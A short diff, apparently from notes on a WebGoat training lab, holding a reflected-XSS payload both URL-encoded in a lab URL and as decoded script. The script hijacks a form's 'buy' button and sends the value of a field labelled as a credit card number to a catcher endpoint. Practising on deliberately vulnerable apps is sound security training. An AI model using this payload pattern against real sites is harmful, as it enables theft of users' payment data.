@@ -1,11 +1,1 @@
 http://localhost:8090/WebGoat/start.mvc#attack/752417971/900?input1=123&input2=%3Cscript%3E%0A%20%20%20%20hack%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20console.log%28document.form.input1.value%29%3B%0A%20%20%20%20%20%20%20%20XssImage%20%3D%20new%20Image%3B%0A%20%20%20%20%20%20%20%20XssImage.src%3D%22http%3A%2F%2Flocalhost%3A8090%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26stolen-credit-card%3D%22%0A%20%20%20%20%20%20%20%20%2B%20new%20String%28document.form.input1.value%29%0A%20%20%20%20%7D%0A%20%20%20%20document.form.buy.setAttribute%28%27onclick%27%2C%20%27hack%28%29%27%29%0A%3C%2Fscript%3E
-
-<script>
-    hack = function() {
-        console.log(document.form.input1.value);
-        XssImage = new Image;
-        XssImage.src="http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolen-credit-card="
-        + new String(document.form.input1.value)
-    }
-    document.form.buy.setAttribute('onclick', 'hack()')
-</script>
